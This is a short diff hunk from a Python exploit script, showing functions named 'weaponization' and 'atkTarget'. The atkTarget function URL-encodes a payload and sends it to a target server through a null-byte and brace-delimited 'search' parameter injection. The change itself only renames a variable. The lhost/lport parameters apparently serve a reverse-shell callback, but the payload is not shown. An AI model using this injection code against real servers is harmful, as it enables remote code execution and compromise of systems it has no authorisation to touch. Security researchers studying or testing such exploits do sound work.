@@ -226,9 +226,9 @@ def weaponization(lhost,lport):
 def atkTarget(rhost,rport,lhost,lport):
     
     # Encode the payload and send a HTTP GET request
-    payload_encode = urllib.parse.quote_plus(payload)
+    payloadd_encode = urllib.parse.quote_plus(payload)
     
-    urll = f'http://{rhost}:{rport}/?search=%00{{.{payload_encode}.}}'
+    urll = f'http://{rhost}:{rport}/?search=%00{{.{payloadd_encode}.}}'
     urllib.request.urlopen(urll)
     print("\n[+] Sending encoded payload via GET request to target")
 
